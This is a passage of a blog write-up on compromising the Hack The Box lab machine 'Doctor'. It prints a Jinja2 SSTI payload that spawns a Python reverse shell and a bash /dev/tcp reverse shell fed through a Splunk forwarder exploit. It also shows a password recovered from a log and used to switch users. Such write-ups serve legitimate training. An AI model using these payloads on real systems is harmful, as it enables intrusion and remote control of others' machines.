class=line><span class=cl><span class=nf>POST</span> <span class=nn>/post/new</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>doctors.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://doctors.htb/post/new</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>35</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>title=test&amp;content=test&amp;submit=Post
</span></span></code></pre></div><p>I fed the request to <code>SQLMap</code>, but it doesn&rsquo;t seem injectable.</p><p>And then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows <code>doctors.htb</code> uses Flask as its backend.</p><p><div class=img-container><img src=imgs/136d4a7725d44c5a9de3b53bd18bfdb9.png alt=136d4a7725d44c5a9de3b53bd18bfdb9></div></p><h4 id=server-side-template-injection-ssti>Server Side Template Injection (SSTI)<a class=anchor aria-hidden=true href=#server-side-template-injection-ssti>#</a></h4><p>Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.</p><blockquote><p>PwnFunction’s video on <a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">SSTI</a> was very informative.</p><p>TryHackMe also has a room called “<a href=https://tryhackme.com/room/flask>Flask</a>” that contains an example of SSTI attack on Flask. I have completed that room, and the note is available on my <a href=https://github.com/fahmifj/TryHackMe-notes/tree/main/flask>GitHub</a>.</p></blockquote><p>Here is the methodology to detect SSTI (taken from <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology>here</a>):</p><p><div class=img-container><img src=imgs/serverside.png alt="SSTI cheatsheet workflow"></div></p><p><code>http://doctors.htb/home?page=1</code> is the first attack vector to target. I used a tool called <code>Tplmap.py</code> to automatically detect SSTI, but no luck.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.3»
</span></span><span class=line><span class=cl>$ python tplmap.py -u <span class=s1>&#39;http://doctors.htb/home?page=iamf&#39;</span>                             
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Tplmap 0.5
</span></span><span class=line><span class=cl>    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Testing <span class=k>if</span> GET parameter <span class=s1>&#39;page&#39;</span> is injectable
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Smarty plugin is testing rendering with tag <span class=s1>&#39;*&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Smarty plugin is testing blind injection
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Ruby plugin is testing blind injection
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Ejs plugin is testing rendering with tag <span class=s1>&#39;*&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Ejs plugin is testing blind injection
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>][</span>checks<span class=o>]</span> Tested parameters appear to be not injectable.
</span></span></code></pre></div><p>The second attack vector is <code>http://doctors.htb/post/new</code>, which allows me to create a post message. It consists of two input vectors: the title and the content/message.</p><p><div class=img-container><img src=imgs/image-20210509023608857.png alt=image-20210509023608857></div></p><p>I copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn&rsquo;t return the expected result.</p><p><div class=img-container><img src=imgs/image-20210509024048415.png alt=image-20210509024048415></div></p><p>It also returns nothing when I submit the payloads on the title.</p><p>After hours trying to figure out why it didn&rsquo;t work, I noticed that the <code>/archive</code> page occasionally returns an error when I put some payload that has the percentage symbol, like <code>{% payload %}</code>, on the content/message section.</p><p><div class=img-container><img src=imgs/image-20210509024504730.png alt=image-20210509024504730></div></p><p>Or sometimes it only has the post title that can be seen only from the page source.</p><p><div class=img-container><img src=imgs/image-20210509024707956.png alt=image-20210509024707956></div></p><p>So from there, I submitted the basic payload on the title.</p><img src=imgs/image-20210509025456790.png alt=image-20210509025456790 style=zoom:50%><p>Right after inserting the payload, I checked the page source of <code>/archive</code>, and I found the expected result of the SSTI payload there.</p><p><div class=img-container><img src=imgs/image-20210509025854497.png alt=image-20210509025854497></div></p><h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4><p>The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my <code>nc</code> listener listening on the port I specified.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=p>()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=o>%</span><span class=p>}{</span><span class=o>%</span> <span class=k>if</span> <span class=s2>&#34;warning&#34;</span> <span class=ow>in</span> <span class=n>x</span><span class=o>.</span><span class=vm>__name__</span> <span class=o>%</span><span class=p>}{{</span><span class=n>x</span><span class=p>()</span><span class=o>.</span><span class=n>_module</span><span class=o>.</span><span class=n>__builtins__</span><span class=p>[</span><span class=s1>&#39;__import__&#39;</span><span class=p>](</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s2>&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class=se>\&#34;</span><span class=s2>10.10.14.4</span><span class=se>\&#34;</span><span class=s2>,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class=se>\&#34;</span><span class=s2>/bin/sh</span><span class=se>\&#34;</span><span class=s2>,</span><span class=se>\&#34;</span><span class=s2>-i</span><span class=se>\&#34;</span><span class=s2>]);&#39;&#34;</span><span class=p>)}}{</span><span class=o>%</span><span class=n>endif</span><span class=o>%</span><span class=p>}{</span><span class=o>%</span> <span class=n>endfor</span> <span class=o>%</span><span class=p>}</span>
</span></span></code></pre></div><p>I have an interactive shell now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «doctor» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9000</span>            
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9000</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.34<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.209<span class=o>]</span> <span class=m>5628</span>
</span></span><span class=line><span class=cl>/bin/sh: 0: can’t access tty<span class=p>;</span> job control turned off
</span></span><span class=line><span class=cl>$ which python
</span></span><span class=line><span class=cl>$ which python3
</span></span><span class=line><span class=cl>/usr/bin/python3
</span></span><span class=line><span class=cl>$ python3 -c <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>web@doctor:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>web<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>web<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>web<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-shaun>Shell as shaun<a class=anchor aria-hidden=true href=#shell-as-shaun>#</a></h3><h4 id=internal-enumeration>Internal Enumeration<a class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>These are the users who have login shells.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>web@doctor:~$ cat /etc/passwd <span class=p>|</span> grep sh$
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>web:x:1001:1001:,,,:/home/web:/bin/bash
</span></span><span class=line><span class=cl>shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
</span></span><span class=line><span class=cl>splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
</span></span></code></pre></div><p>Because <code>web</code> is a member of the <code>adm</code> group, I can read the log files at <code>/var/log</code>. While enumerating with <code>find</code> command, I caught an Apache2 log called &ldquo;backup&rdquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>web@doctor:~$ find / -type f -readable -group adm 2&gt;/dev/null
</span></span><span class=line><span class=cl>/var/log/kern.log.3.gz
</span></span><span class=line><span class=cl>/var/log/auth.log
</span></span><span class=line><span class=cl>/var/log/syslog
</span></span><span class=line><span class=cl>/var/log/ufw.log.2.gz
</span></span><span class=line><span class=cl>/var/log/dmesg.2.gz
</span></span><span class=line><span class=cl>/var/log/auth.log.1
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>/var/log/apache2/backup
</span></span></code></pre></div><p>Searching string &ldquo;pass&rdquo; on the backup log reveals this line.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>web@doctor:/var/log/apache2$ cat backup <span class=p>|</span> grep pass
</span></span><span class=line><span class=cl>10.10.14.4 - - <span class=o>[</span>05/Sep/2020:11:17:34 +2000<span class=o>]</span> <span class=s2>&#34;POST /reset_password?email=Guitar123&#34;</span> <span class=m>500</span> <span class=m>453</span> <span class=s2>&#34;http://doctor.htb/reset_password&#34;</span>
</span></span></code></pre></div><p>It printed as <code>email=Guitar123</code>, but it doesn&rsquo;t look like an email to me.</p><h4 id=su---shaun>SU - shaun<a class=anchor aria-hidden=true href=#su---shaun>#</a></h4><p>It turns out that <code>Guitar123</code> is shaun&rsquo;s password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>web@doctor:/var/log/apache2$ su shaun
</span></span><span class=line><span class=cl>Password: Guitar123
</span></span><span class=line><span class=cl>web@doctor:/var/log/apache2$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>shaun<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>shaun<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>shaun<span class=o>)</span>
</span></span></code></pre></div><p>User flag is done here.</p><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=exploiting-splunk-with-pysplunkwhisperer2>Exploiting Splunk with PySplunkWhisperer2<a class=anchor aria-hidden=true href=#exploiting-splunk-with-pysplunkwhisperer2>#</a></h4><p>I&rsquo;ll recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.</p><p>The researcher stated that the Splunk UF agent&rsquo;s username is always admin.</p><blockquote><p>Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 &mldr;</p></blockquote><p>But that&rsquo;s not the case on this machine, because I can use <code>shaun:Guitar123</code> to authenticate to the Splunk UF services on port 8089.</p><p>I tried <a href=https://github.com/cnotin/SplunkWhisperer2>this PoC</a> from GitHub using the bash reverse shell as payload,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.3»
</span></span><span class=line><span class=cl>$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port <span class=m>8089</span> --username shaun --password Guitar123 --payload <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9001 0&gt;&amp;1&#39;&#34;</span> --lhost 10.10.14.3
</span></span><span class=line><span class=cl>Running in remote mode <span class=o>(</span>Remote Code Execution<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Authenticating...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Authenticated
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Creating malicious app bundle...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Created malicious app bundle in: /tmp/tmpkwnss3rw.tar
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Started HTTP server <span class=k>for</span> remote mode
</span></span><span class=line><span class=cl><span class=o>[</span>.<span class=o>]</span> Installing app from: http://10.10.14.3:8181/
</span></span><span class=line><span class=cl>10.10.10.209 - - <span class=o>[</span>03/Feb/2021 05:09:23<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> App installed, your code should be running now!
</span></span></code></pre></div><p>and it worked smoothly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «doctor» «10.10.14.3» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>9001</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>9001</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.3<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.209<span class=o>]</span> <span class=m>48834</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1137<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@doctor:/# id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</span></span></code></pre></div><p>I can grab the root flag.</p><p><div class=img-container><img src=imgs/image-20210509042058603.png alt=image-20210509042058603></div></p><div class=post-references><h2>References</h2><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 target=_blank rel="noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li><li><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0" target=_blank rel="noopener noreferrer">https://www.youtube.com/watch?v=SN6EVIG4c-0</a></li><li><a href=https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/ target=_blank rel="noopener noreferrer">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li></ul></div></div></div><div class=post-meta-bottom><span class=post-origin>Originally published at&nbsp;<a href=https://fahmifj.medium.com/hack-the-box-doctor-10-10-10-209-writeup-902fe05997e0 target=_blank rel="noopener noreferrer">fahmifj.medium.com</a></span></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/command-injection/>Command-injection</a></li><li><a href=https://fahmifj.github.io/tags/ssti/>SSTI</a></li><li><a href=https://fahmifj.github.io/tags/splunk/>Splunk</a></li><li><a href=https://fahmifj.github.io/tags/splunkwhisperer/>SplunkWhisperer</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Doctor on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Doctor&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f&hashtags=Linux%2cCommand-injection%2cSSTI%2cSplunk%2cSplunkWhisperer"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Doctor on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f&title=HackTheBox%20-%20Doctor&summary=HackTheBox%20-%20Doctor&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Doctor on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f&title=HackTheBox%20-%20Doctor"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Doctor on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Doctor on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Doctor%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Doctor on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Doctor&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdoctor%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>